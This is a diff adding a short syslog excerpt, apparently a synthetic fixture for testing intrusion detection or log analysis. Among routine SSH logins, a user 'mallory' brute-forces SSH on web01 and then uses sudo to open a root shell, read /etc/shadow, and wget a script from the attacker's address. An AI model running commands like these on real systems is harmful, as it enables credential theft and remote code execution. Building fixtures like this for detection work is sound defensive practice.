@@ -1,0 +1,14 @@
+<38>Jun 24 08:55:11 db01 sshd[1490]: Accepted publickey for deploy from 10.0.2.20 port 51002 ssh2
+<38>Jun 24 09:01:33 app02 sshd[1771]: Accepted password for backup from 10.0.2.21 port 51010 ssh2
+<86>Jun 24 09:03:02 app02 sudo:   deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/id
+<38>Jun 24 09:14:01 web01 sshd[2011]: Failed password for invalid user mallory from 203.0.113.7 port 40221 ssh2
+<38>Jun 24 09:14:03 web01 sshd[2011]: Failed password for invalid user mallory from 203.0.113.7 port 40222 ssh2
+<38>Jun 24 09:14:05 web01 sshd[2011]: Failed password for invalid user mallory from 203.0.113.7 port 40223 ssh2
+<38>Jun 24 09:14:06 web01 sshd[2011]: Failed password for invalid user mallory from 203.0.113.7 port 40224 ssh2
+<38>Jun 24 09:14:12 web01 sshd[2015]: Accepted password for mallory from 203.0.113.7 port 40225 ssh2
+<86>Jun 24 09:15:22 web01 sudo:   mallory : TTY=pts/0 ; PWD=/home/mallory ; USER=root ; COMMAND=/bin/bash
+<86>Jun 24 09:15:40 web01 sudo:   mallory : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow
+<86>Jun 24 09:16:02 web01 sudo:   mallory : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.7/x.sh
+<85>Jun 24 09:20:00 db01 sshd[1502]: Accepted password for backup from 10.0.2.21 port 51044 ssh2
+<85>Jun 24 09:21:10 mail03 CRON[3001]: pam_unix(cron:session): session opened for user root by (uid=0)
+<38>Jun 24 09:25:51 db01 sshd[1599]: Accepted publickey for deploy from 10.0.2.20 port 51070 ssh2
